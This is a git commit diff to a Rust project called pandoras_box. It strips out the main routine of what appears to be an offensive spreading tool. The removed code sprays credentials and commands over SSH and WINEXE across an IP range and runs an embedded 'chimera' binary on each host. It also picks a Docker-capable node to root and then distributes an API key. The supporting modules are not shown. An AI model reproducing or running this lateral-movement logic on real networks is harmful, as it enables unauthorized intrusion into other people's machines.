df1ff763ae147ac0e9786bcc156d743ec82bf44a
M00NLIG7 <test@test.com>
2024-09-11 15:03:35 -0700

    Refactoring to version 2

--- pandoras_box/src/main.rs
+++ pandoras_box/src/main.rs
@@ -1,7 +1,3 @@
-// mod enumeration;
-mod api;
-// mod init;
-mod net;
 use clap::{arg as carg, command, value_parser};
 
 use std::collections::BinaryHeap;
@@ -9,16 +5,14 @@ use std::sync::{Arc, Mutex};
 use std::io::Read;
 // use enumeration::ping;
 //use std::future::Future;
-use crate::net::communicator::{Credentials, Session};
 // use crate::net::spread::spreader::Spreader;
 // use crate::net::spread::spreader::ConnectionPool;
-use crate::net::winexe::*;
 use tokio::sync::watch;
 use flate2::read::ZlibDecoder;
 use std::process::Command;
 
 // const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");
-const COMPRESSED_CHIMERA: &[u8] = include_bytes!("../bin/chimera_win.zlib");
+//const COMPRESSED_CHIMERA: &[u8] = include_bytes!("../bin/chimera_win.zlib");
 
 struct MemoryReport;
 
@@ -60,96 +54,5 @@ async fn main() {
 
     let range = matches.get_one::<String>("range").unwrap();
     let password = matches.get_one::<String>("password").unwrap();
-
-
-
-    let (api_key_sender, mut api_key_receiver) = watch::channel(String::new());
-    let shared_api_key = Arc::new(api_key_sender);
-
-
-    // Self::start_winexe_container(self.container_path.clone().unwrap()).await?;
-
-
-    // Decompressed data is created at startup and should live throughout the application lifetime
-    let chimera_win = decompress_data(COMPRESSED_CHIMERA);
-    let chimera_win_arc = Arc::new(chimera_win);
-
-
-    // Initialize the binary heap
-    let server_heap = Arc::new(Mutex::new(BinaryHeap::new()));
-
-    // Fetch srv_handle and srv from api::start_server
-    let (srv, srv_handle) = api::start_server(shared_api_key.clone(), server_heap.clone(), chimera_win_arc).await;
-
-    tokio::spawn(srv);
-
-
-    //WinexeClient::start_winexe_container("/tmp/".into()).await.unwrap();
-
-    let start_tio = std::time::Instant::now();
-    let mut x = crate::net::spread::spreader::Spreader::new(range, password).await;
-
-
-    x.spread().await;
-
-    let nix_cmd = format!("/tmp/chimera password");
-    let win_cmd = format!("C:\\temp\\chimera.exe password");
-
-
-    let cmd_futures = vec![
-        x.command_spray("SSH", &nix_cmd, vec![]),
-        x.command_spray("WINEXE", &win_cmd, vec![]),
-    ];
-
-    futures::future::join_all(cmd_futures).await;
-    
-
-    let golden_node;
-
-    loop {
-        if server_heap.lock().unwrap().len() <= 0 {
-            panic!("No nodes suitable nodes found!");
-        } 
-        if let Some(node) = server_heap.lock().unwrap().pop() {
-            println!("{:?}", node);
-            if node.supports_docker {
-                golden_node = node;
-                break;
-            }
-        }
-    }
-
-    let golden_ip = &golden_node.ip.to_string();
-
-    let _ = x.root(golden_ip).await;
-
-    // Wait for the API key to be updated
-    let mut api_key = String::new();
-    while api_key.is_empty() {
-        println!("Waiting for API Key...");
-        api_key_receiver.changed().await.unwrap();
-        api_key = api_key_receiver.borrow().clone();
-    }
-
-    let nix_cmd = format!("/tmp/chimera init -m {} -k {}", golden_ip, api_key);
-    let win_cmd = format!("C:\\temp\\chimera.exe init -m {} -k {}", golden_ip, api_key);
-
-    println!("Nix Command: {}", nix_cmd);
-
-    let cmd_futures = vec![
-        x.command_spray("SSH", &nix_cmd, vec![]),
-        x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]),
-    ];
-
-    futures::future::join_all(cmd_futures).await;
-    //x.command_spray("SSH", &nix_cmd, vec![]).await;
-    //x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]).await;
-
-
-    srv_handle.stop(true).await;
-    x.close().await;
-    println!("{:?}", golden_node);
-
-    let _memory_report = MemoryReport;
-    println!("Total Elapsed Time {:?}", start_tio.elapsed());
 }
+
